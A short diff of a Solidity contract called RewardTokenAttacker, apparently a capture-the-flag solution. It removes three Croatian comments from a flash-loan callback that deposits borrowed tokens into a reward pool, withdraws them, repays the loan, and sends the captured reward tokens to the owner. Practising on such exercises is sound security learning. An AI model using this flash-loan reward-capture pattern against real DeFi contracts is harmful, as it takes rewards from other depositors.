@@ -44,13 +44,10 @@ contract RewardTokenAttacker {
     }
 
     function receiveFlashLoan(uint256 amount) external {
-        /*Approvaj rewarderPool contractu da moze radit s nasim tokenima -> msg.sender je contract */
         liquidityToken.approve(rewarderPoolAddress,amount);
         IRewardPool(rewarderPoolAddress).deposit(amount);
         IRewardPool(rewarderPoolAddress).withdraw(amount);
-        //Vrati flash loan
         liquidityToken.transfer(flashLoanPoolAddress,amount);
-        //transferiraj reward tokene na racun ownera
         rewardToken.transfer(owner,rewardToken.balanceOf(address(this)));
     }
 }
